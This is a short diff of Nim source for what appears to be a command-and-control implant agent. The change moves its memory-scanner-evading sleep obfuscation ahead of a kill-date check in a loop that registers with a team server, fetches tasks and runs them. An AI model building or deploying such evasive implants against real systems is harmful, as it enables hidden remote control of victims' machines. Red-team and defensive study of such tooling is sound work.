@@ -15,8 +15,8 @@ proc main() =
 
     #[
         Agent routine: 
-        1. Check kill date
-        2. Sleep Obfuscation
+        1. Sleep obfuscation
+        2. Check kill date
         3. Register to the team server if not already connected
         4. Retrieve tasks via checkin request to a GET endpoint
         5. Execute task and post result
@@ -25,14 +25,14 @@ proc main() =
     ]#
     while true: 
         try: 
-            # Check kill date and exit the agent process if it is already passed
+            # Sleep obfuscation to evade memory scanners
+            sleepObfuscate(ctx.sleepSettings)
+
+            # Check kill date and exit the agent process if it is reached
             if ctx.killDate != 0 and now().toTime().toUnix().int64 >= ctx.killDate: 
                 print "[*] Reached kill date: ", ctx.killDate.fromUnix().utc().format("dd-MM-yyyy HH:mm:ss"), " (UTC)."
                 print "[*] Exiting."
                 exit()
-
-            # Sleep obfuscation to evade memory scanners
-            sleepObfuscate(ctx.sleepSettings)
             
             # Register
             if not ctx.registered: 
